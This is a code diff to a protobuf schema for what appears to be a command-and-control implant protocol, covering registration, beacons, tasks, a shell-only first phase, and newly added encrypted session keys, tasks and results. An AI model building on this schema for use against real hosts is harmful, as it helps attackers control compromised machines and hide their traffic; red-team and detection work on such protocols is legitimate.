@@ -46,23 +46,26 @@ message Register {
 }
 
 message RegisterResponse {
-  bool   success        = 1;
-  string session_id     = 2;
-  int64  next_checkin_ms = 3;
+  bool   success              = 1;
+  string session_id           = 2;
+  int64  next_checkin_ms      = 3;
+  bytes  encrypted_session_key = 4; // AES session key encrypted with pre-shared secret
 }
 
 message Beacon {
-  string       implant_id = 1;
-  string       session_id = 2;
-  int64        timestamp  = 3;
-  bytes        hmac       = 4;
-  repeated TaskResult results = 5;
+  string       implant_id       = 1;
+  string       session_id       = 2;
+  int64        timestamp        = 3;
+  bytes        hmac             = 4;
+  repeated TaskResult results   = 5;
+  bytes        encrypted_results = 6; // replaces results when session key active
 }
 
 message BeaconResponse {
   repeated Task tasks          = 1;
   int64         next_checkin_ms = 2;
   bool          terminate      = 3;
+  bytes         encrypted_tasks = 4; // replaces tasks when session key active
 }
 
 message Task {
@@ -79,6 +82,15 @@ message TaskResult {
   bytes  data             = 3;  // Serialized per-task result
   string error            = 4;
   int64  execution_time_ms = 5;
+}
+
+// Helper messages for encrypted payloads
+message BeaconResultsPayload {
+  repeated TaskResult results = 1;
+}
+
+message BeaconTasksPayload {
+  repeated Task tasks = 1;
 }
 
 // --- Per-Task Payloads (Phase 1: Shell only) ---
